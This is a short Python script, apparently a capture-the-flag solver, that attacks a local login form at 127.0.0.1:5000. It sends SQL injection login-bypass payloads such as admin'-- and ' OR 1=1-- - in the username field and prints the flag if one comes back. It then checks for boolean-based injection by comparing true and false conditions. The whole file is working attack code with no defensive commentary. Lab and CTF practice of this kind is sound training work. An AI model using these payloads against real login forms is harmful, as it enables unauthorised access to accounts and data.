import requests

URL = "http://127.0.0.1:5000/"

def send(payload):
    try:
        return requests.post(URL, data={"username": payload, "password": "x"}, timeout=5)
    except:
        return None

def detect_login_bypass():
    payloads = [
        "admin'--",
        "' OR 1=1-- -",
        "' OR '1'='1",
        "') OR ('1'='1-- -"
    ]

    for p in payloads:
        r = send(p)
        if r and "FLAG" in r.text:
            print(f"[+] SQL Injection SUCCESS with payload: {p}")
            print("[+] FLAG FOUND!")
            print(r.text)
            return True

    return False

def detect_boolean():
    r_true = send("' OR 1=1-- -")
    r_false = send("' OR 1=2-- -")

    if r_true and r_false:
        if "Login successful" in r_true.text and "Invalid" in r_false.text:
            print("[+] Boolean-based SQLi confirmed")
            return True

    return False

def run():
    print(f"[+] Target: {URL}")

    if detect_login_bypass():
        return

    if detect_boolean():
        return

    print("[-] No SQLi detected (or different vuln type)")

if __name__ == "__main__":
    run()